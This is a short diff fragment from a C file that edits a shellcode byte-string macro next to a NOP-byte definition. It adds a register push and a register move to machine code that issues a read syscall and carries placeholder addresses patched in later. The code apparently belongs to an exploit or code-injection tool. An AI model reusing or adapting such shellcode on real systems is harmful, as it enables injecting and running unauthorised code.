@@ -54,7 +54,8 @@ typedef struct
 
 #define NOP                 '\x90'
 
-#define SHELLCODE_MAIN      "\x31\xc0" \
+#define SHELLCODE_MAIN      "\x53" \
+                            "\x31\xc0" \
                             "\xb0\x03" \
                             "\x31\xdb" \
                             "\xb9\xff\xff\xff\xff" \
@@ -63,6 +64,7 @@ typedef struct
                             "\xcd\x80" \
                             "\x48\x31\xff" \
                             "\xbf\xff\xff\xff\xff" \
+                            "\x48\x89\xfe" \
                             "\xe8\xff\xff\xff\xff" \
                             "\x31\xc0" \
                             "\xff\xc0" \
